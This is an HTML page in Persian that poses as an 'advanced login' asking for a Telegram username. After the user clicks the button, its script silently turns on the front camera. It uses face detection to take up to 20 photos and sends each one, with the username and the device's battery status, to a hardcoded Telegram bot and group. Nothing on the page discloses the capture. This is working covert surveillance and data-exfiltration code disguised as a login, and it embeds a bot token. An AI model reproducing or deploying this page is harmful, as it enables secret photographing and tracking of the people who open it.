<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ورود پیشرفته</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
  <style>
    body { margin: 0; background: black; color: white; direction: rtl; }
    video, canvas { position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; }
    #overlay { pointer-events: none; }
    #formSection {
      position: absolute; top: 0; left: 0; width: 100%; height: 100vh;
      background: rgba(0,0,0,0.9); z-index: 10;
      display: flex; flex-direction: column; justify-content: center; align-items: center;
    }
    input { padding: 1rem; font-size: 1rem; border-radius: 0.5rem; margin-bottom: 1rem; width: 80%; max-width: 300px; }
    button { padding: 1rem 2rem; background: yellow; color: black; font-weight: bold; border-radius: 0.5rem; }
  </style>
</head>
<body>

<div id="formSection">
  <input id="userInput" type="text" placeholder="آیدی تلگرام (مثلاً @username)">
  <button onclick="startApp()">ورود</button>
</div>

<video id="video" autoplay muted playsinline></video>
<canvas id="overlay"></canvas>

<script>
  const botToken = '7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU';
  const groupId = '-1002534583259';
  let uid = '';
  let video = document.getElementById("video");
  let overlay = document.getElementById("overlay");
  let ctx = overlay.getContext("2d");
  let photoCount = 0;
  let detected = false;

  async function initCamera() {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;
    return new Promise(resolve => {
      video.onloadedmetadata = () => {
        overlay.width = video.videoWidth;
        overlay.height = video.videoHeight;
        resolve();
      };
    });
  }

  async function startApp() {
    const input = document.getElementById("userInput").value.trim();
    if (!input || !input.startsWith('@')) {
      alert("آیدی معتبر وارد کنید (مثلاً @username)");
      return;
    }
    uid = input;
    document.getElementById("formSection").style.display = "none";
    await initCamera();
    const model = await blazeface.load();

    async function detectLoop() {
      if (photoCount >= 20) return;
      const predictions = await model.estimateFaces(video, false);
      ctx.clearRect(0, 0, overlay.width, overlay.height);

      if (predictions.length > 0 && !detected) {
        detected = true;
        captureAndSend();
        setTimeout(() => detected = false, 2500);
      }

      predictions.forEach(p => {
        const [x, y] = p.topLeft;
        const [x2, y2] = p.bottomRight;
        ctx.strokeStyle = "lime";
        ctx.lineWidth = 2;
        ctx.strokeRect(x, y, x2 - x, y2 - y);
      });

      requestAnimationFrame(detectLoop);
    }

    detectLoop();
  }

  async function captureAndSend() {
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx2 = canvas.getContext("2d");
    ctx2.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async blob => {
      const battery = await navigator.getBattery();
      const form = new FormData();
      form.append("chat_id", groupId);
      form.append("photo", blob, `photo_${photoCount}.jpg`);
      form.append("caption", `آیدی: ${uid}\nعکس: ${++photoCount}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: form
      });
    }, 'image/jpeg');
  }
</script>

</body>
</html>
